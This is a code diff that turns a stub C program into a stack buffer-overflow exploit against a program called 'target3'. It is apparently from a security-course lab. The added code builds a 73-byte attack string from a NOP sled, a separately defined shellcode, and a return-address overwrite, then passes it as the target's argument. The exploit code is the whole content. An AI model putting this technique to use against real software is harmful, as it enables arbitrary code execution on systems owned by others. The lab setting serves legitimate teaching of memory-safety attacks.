@@ -6,14 +6,26 @@
 
 #define TARGET "../targets/target3"
 
+#define BUF_SIZE 73
+
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
 
-	args[0] = TARGET;
-	args[1] = "hi there";
+	char attack[73];
+
+	strcpy(attack, "\x90");
+	int i;
+	for (i = 0; i < 22; i++)
+        strcat(attack, "\x90");
+
+	strcat(attack, shellcode);
+	strcat(attack, "\x10\xfe\x21\x20\x00");
+
+    args[0] = TARGET;
+	args[1] = attack;
 	args[2] = NULL;
 
 	env[0] = NULL;
@@ -23,3 +35,4 @@ main ( int argc, char * argv[] )
 
 	return (0);
 }
+
